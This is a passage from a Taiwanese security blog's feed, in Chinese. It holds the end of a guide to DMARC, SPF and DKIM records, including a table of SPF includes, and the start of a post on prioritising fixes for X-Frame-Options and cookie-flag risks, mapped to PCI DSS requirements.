&lt;p&gt;如果決定把報告寄到其他網域的話，務必注意收信人網域有沒有授權接收報告。根據 RFC 規範，收信人網域需要在 &lt;code&gt;&amp;lt;dmarc domain&amp;gt;._report._dmarc.&amp;lt;reporting domain&amp;gt;&lt;/code&gt; 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：&lt;a href=&quot;http://sender.com/&quot;&gt;sender.com&lt;/a&gt;，收報告地址為：report@thirdparty.com，則 &lt;a href=&quot;http://thirdparty.com/&quot;&gt;thirdparty.com&lt;/a&gt; 要在 &lt;code&gt;sender.com._report._dmarc.thirdparty.com&lt;/code&gt; 發一筆內容為 &lt;code&gt;v=DMARC1&lt;/code&gt; 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。&lt;/p&gt;
&lt;p&gt;豆知識：前面提到的 &lt;a href=&quot;http://dmarcanalyzer.com/&quot;&gt;dmarcanalyzer.com&lt;/a&gt;，就是設定接收所有報告哦！&lt;code&gt;*._report._dmarc.rep.dmarcanalyzer.com TXT &amp;quot;v=DMARC1;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;另外，如果你是第一次設定，建議 &lt;code&gt;p=reject&lt;/code&gt; 先改成 &lt;code&gt;p=none&lt;/code&gt; 防止信件突然都被擋掉。請確認每日的彙整報告結果符合預期，並搭配手動檢查原始信件看看不同收信 mail server 效果如何，等實驗了一陣子都沒問題，再逐漸改成更嚴格的 &lt;code&gt;p=quarantine&lt;/code&gt; ，穩定後使用 &lt;code&gt;p=reject&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD&quot;&gt;#&lt;/a&gt; 情境一：實驗中&lt;/h3&gt;
&lt;p&gt;如果你還在實驗階段，不希望所有的信都被擋下，可以用寬鬆一點的 policy 或是低一點的 percentage 讓部分信件通過驗證：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;// lax policy  &lt;br&gt;v=DMARC1 p=none rua=mailto:xx ruf=mailto:xx&lt;br&gt;&lt;br&gt;// lower percentage of policy application  &lt;br&gt;v=DMARC1 p=quarantine pct=20 rua=mailto:xx ruf=mailto:xx&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 情境二：沒有子網域&lt;/h3&gt;
&lt;p&gt;如果寄信網域只有一個，或是沒有多個子網域共用 DMARC 紀錄：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=DMARC1 p=reject aspf=s adkim=s rua=mailto:xx ruf=mailto:xx&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc&quot;&gt;#&lt;/a&gt; 情境三：子網域共用 DMARC&lt;/h3&gt;
&lt;p&gt;如果 DMARC 紀錄涵蓋多個子網域：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=DMARC1 p=reject rua=mailto:xx ruf=mailto:xx&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果你想為子網域設定寬鬆一點的 policy，也可以用 &lt;code&gt;sp&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;v=DMARC1 p=reject sp=quarantine rua=mailto:xx ruf=mailto:xx&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2&quot;&gt;#&lt;/a&gt; 發布紀錄&lt;/h3&gt;
&lt;p&gt;請在你的 DNS 裡以 TXT 類型發布到 &lt;code&gt;_dmarc.&amp;lt;yourdomain&amp;gt;&lt;/code&gt; 這個網域，應該一樣幾分鐘就可以在 mxtoolbox 上查詢到了。如果有把報告寄到其他網域，也請確定有發布授權紀錄。&lt;/p&gt;
&lt;h3 id=&quot;%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F&quot;&gt;#&lt;/a&gt; 不寄信的網域&lt;/h3&gt;
&lt;p&gt;上面講了會寄信的網域該如何設置，那不寄信的網域怎麼辦呢？畢竟什麼都沒設置的話，駭客用這些子網域寄信就能躲過驗證啊！&lt;/p&gt;
&lt;p&gt;很簡單，明文禁止所有信件就好。如果有很多個不寄信的網域的話，也可以用 CNAME 的方式指到一筆紀錄，方便管理。&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;# SPF&lt;br&gt;record: v=spf1 -all  &lt;br&gt;DNS: parked.mydom.com TXT &quot;v=spf1 -all&quot;&lt;br&gt;&lt;br&gt;# DKIM&lt;br&gt;record: v=DKIM1; p=  &lt;br&gt;DNS: \*.\_domainkey.parked.mydom.com TXT &quot;v=DKIM1; p=&quot;&lt;br&gt;&lt;br&gt;# DMARC&lt;br&gt;record: v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx  &lt;br&gt;## DNS for one parked domain:  &lt;br&gt;_dmarc.parked.mydom.com TXT &quot;v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx&quot;&lt;br&gt;&lt;br&gt;## DNS for many parked domains:   &lt;br&gt;_dmarc.parked1.mydom.com CNAME _dmarc.parkeddoms.mydom.com  &lt;br&gt;_dmarc.parked2.mydom.com CNAME _dmarc.parkeddoms.mydom.com  &lt;br&gt;_dmarc.parked3.mydom.com CNAME _dmarc.parkeddoms.mydom.com  &lt;br&gt;_dmarc.parkeddoms.mydom.com TXT &quot;v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx&quot;&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3 id=&quot;resources&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#resources&quot;&gt;#&lt;/a&gt; Resources&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://dmarcly.com/blog/how-to-set-up-dmarc-dkim-and-spf-in-office-365-o365-the-complete-implementation-guide&quot;&gt;DMARCLY: Setting up SPF, DKIM, DMARC for Office365&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-amazon-ses&quot;&gt;DMARCLY: Setting up SPF, DKIM for Amazon SES&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://dmarcly.com/blog/spf-dkim-dmarc-set-up-guide-for-g-suite-gmail-for-business&quot;&gt;DMARCLY: Setting up SPF, DKIM, DMARC for Gsuite&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;SPF domains for common third party services:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;SPF&lt;/th&gt;
&lt;th&gt;Lookups&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Google&lt;/td&gt;
&lt;td&gt;&lt;code&gt;_spf.google.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft (Office 365)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;spf.protection.outlook.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Amazon SES&lt;/td&gt;
&lt;td&gt;&lt;code&gt;amazonses.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MailChimp&lt;/td&gt;
&lt;td&gt;&lt;code&gt;servers.mcsv.net&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SendGrid&lt;/td&gt;
&lt;td&gt;&lt;code&gt;sendgrid.net&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FreshDesk&lt;/td&gt;
&lt;td&gt;&lt;code&gt;email.freshdesk.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;7 (includes sendgrid)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Mandrill&lt;/td&gt;
&lt;td&gt;&lt;code&gt;spf.mandrillapp.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Mailgun&lt;/td&gt;
&lt;td&gt;&lt;code&gt;mailgun.org&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Mimecast&lt;/td&gt;
&lt;td&gt;&lt;code&gt;_netblocks.mimecast.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Postmark&lt;/td&gt;
&lt;td&gt;&lt;code&gt;spf.mtasv.net&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HelpScout&lt;/td&gt;
&lt;td&gt;&lt;code&gt;helpscoutemail.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Qualtrics&lt;/td&gt;
&lt;td&gt;&lt;code&gt;_spf.qualtrics.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SparkPost&lt;/td&gt;
&lt;td&gt;&lt;code&gt;sparkpostmail.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Zoho&lt;/td&gt;
&lt;td&gt;&lt;code&gt;zoho.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Salesforce&lt;/td&gt;
&lt;td&gt;&lt;code&gt;_spf.salesforce.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Zendesk&lt;/td&gt;
&lt;td&gt;&lt;code&gt;mail.zendesk.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ConstantContact&lt;/td&gt;
&lt;td&gt;&lt;code&gt;spf.constantcontact.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sendinblue&lt;/td&gt;
&lt;td&gt;&lt;code&gt;sendinblue.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;9 (includes google and zendesk)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MailerLite&lt;/td&gt;
&lt;td&gt;&lt;code&gt;_spf.mlsend.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Keap&lt;/td&gt;
&lt;td&gt;&lt;code&gt;infusionmail.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sendpulse&lt;/td&gt;
&lt;td&gt;&lt;code&gt;mxsmtp.sendpulse.com&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

		</content>
	</entry>
	
	<entry>
		<title>資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/"/>
		<updated>2021-07-16T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;繼上一篇的&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/&quot;&gt;&lt;strong&gt;資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！&lt;/strong&gt;&lt;/a&gt;)之後，接著我們要來談談關於網站風險的修復，這部分我想大家的直覺應該都是&lt;strong&gt;無條件高風險先修&lt;/strong&gt;，但當以這個思維執行時，&lt;strong&gt;把時間以及金錢成本加入權衡之後，又總是很難給出一個符合老闆期待的高 CP 值作法&lt;/strong&gt;，而這其實就是我們今天所要討論的主題，&lt;strong&gt;如何有效率的選擇風險進行修復&lt;/strong&gt;以及&lt;strong&gt;風險在法規技術面上的影響。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E6%91%98%E8%A6%81&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%91%98%E8%A6%81&quot;&gt;#&lt;/a&gt; 摘要&lt;/h2&gt;
&lt;p&gt;這些商業網站（ e.g. 擁有會員登入、金流功能）在修復風險以前，若將改善複雜度加入考量，可以很大程度的減少在風險管理上的困難，那麼什麼是改善複雜度呢？&lt;/p&gt;
&lt;p&gt;改善複雜度就是在權衡了&lt;strong&gt;時間以及金錢成本後做出的最適風險修復方案。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;舉例來說 常常會聽到許多朋友反應 CSRF Token 設置不易，沒有這麼多時間可以對這項風險進行設定，這時候我會詢問兩個問題&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;產業別是否為金融產業（風險管控特別嚴格的產業）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;網站的 Cookie 是否設置了 SameSite 的屬性&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;問這兩個問題的原因為，在不屬於風險管控特別嚴格的產業中，當網站的 Cookie 設置了 SameSite 時，通常是可以將 CSRF Token 的設置順序向後排，待有資源時再執行此風險的修復，原因是 SameSite 的功能便是在網站執行跨站請求時，讓伺服器端無法從 Cookie 中取得 Session Id ，進而阻止 CSRF 風險的發生，當然，若是網站連 SameSite 的屬性都尚未設置的話，那我會強烈建議儘速執行 SameSite 的設置，接著將預計花費在設置 CSRF Token 這項高改善複雜度中風險的人力及時間，挪到其餘序列更高的風險修補上（ e.g 低改善複雜度中風險）&lt;/p&gt;
&lt;p&gt;當然權衡的因素很多，除了改善的難易度以外，評估修復的順序也必須思考風險本身的風險（包括攻擊難易度、弱點普遍度、漏洞影響程度）而在接下來的章節中，我也會把這些因素加入說明。&lt;/p&gt;
&lt;p&gt;此外，因應產業對於法規面的需求，以下說明也會提到常見的風險可能會對應到法規中哪一項規範的技術面項目。&lt;/p&gt;
&lt;h2 id=&quot;%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6&quot;&gt;#&lt;/a&gt; 常見風險改善複雜度&lt;/h2&gt;
&lt;p&gt;說明了什麼是改善複雜度後，接下來將改善複雜度實際套用到上一篇中的常見風險來和大家說明，除了希望能夠更清楚的說明改善複雜度的概念以外，也希望當各位遇到以下風險時， 能夠以此當做參考來進行最適的風險修復方案。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-common-risk-fix/p1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №５ X-Frame-Options 未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排行第五的 X-Frame-Options 設置，在這個項目裡有大於 50％ 的網站設置的安全等級不足或是沒有進行設置，X-Frame-Options 用途為&lt;strong&gt;針對 Iframe 點擊劫持攻擊&lt;/strong&gt;的手法進行防禦，避免網頁被內嵌。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;#&lt;/a&gt; &lt;strong&gt;改善複雜度等級為：低複雜度中風險&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;X-Frame-Options 未設置或安全等級不足：建議若&lt;/strong&gt;要避免此風險，需確保只有可信任來源才能嵌入 。&lt;/p&gt;
&lt;p&gt;此項目的改善複雜度並不高，只要按照修復風險參考資料中的設定，選擇適合網站的值即可，建議可以在 Cookie 的三項基本設置完成後進行風險修補。&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A&quot;&gt;#&lt;/a&gt; 常見風險對應法規技術面項目：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;PCIDSS&lt;/strong&gt;：Develop and maintain secure systems and applications&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包：需防範可能導致內嵌或是注入的攻擊。&lt;/strong&gt;&lt;/h3&gt;
&lt;h3 id=&quot;%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;#&lt;/a&gt; &lt;strong&gt;修復風險參考資料：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options&quot;&gt;&lt;strong&gt;X-Frame-Options 回應標頭 - HTTP | MDN&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №４Cookie 基本設定未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排名第四的 Cookie 基本設定未設置或安全等級不足，在這個項目裡有大於 60％ 的網站設置安全等級不足或是沒有進行設置，而 Cookie 的三項基本設定為，能夠&lt;strong&gt;阻止（ XSS ）跨站腳本攻擊影響擴大&lt;/strong&gt;的 HttpOnly 、&lt;strong&gt;強化 Https 機制&lt;/strong&gt;的 Secure 以及&lt;strong&gt;預防（ CSRF ）跨站請求偽冒&lt;/strong&gt;的 SameSite 。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：低複雜度中風險&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;SameSite 未設定&lt;/strong&gt;：建議依據網站需求選用 Strict 或 Lax 進行設定&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HttpOnly Flag 未設定&lt;/strong&gt;：建議在設置中開啟 HttpOnly&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Secure Flag 未設定&lt;/strong&gt;：建議在設置中開啟Secure&lt;/p&gt;
&lt;p&gt;三個項目的改善複雜都不高，如果檢測出未開啟或進行設定的話，建議三項應優先且儘速進行設置。&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2&quot;&gt;#&lt;/a&gt; 常見風險對應法規技術面項目：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;PCIDSS&lt;/strong&gt;：Develop and maintain secure systems and applications&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.9: Do not allow cross-site request forgery (CSRF).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包：除了防範可能導致內嵌或是注入的攻擊，針對 XSS 以及 CSRF 的攻擊也需要特別注意。&lt;/strong&gt;&lt;/h3&gt;
&lt;h3 id=&quot;%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A&quot;&gt;#&lt;/a&gt; 風險修復參考資料：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/&quot;&gt;&lt;strong&gt;零基礎資安系列（三）-網站安全三本柱（Secure &amp;amp; SameSite &amp;amp; HttpOnly）&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
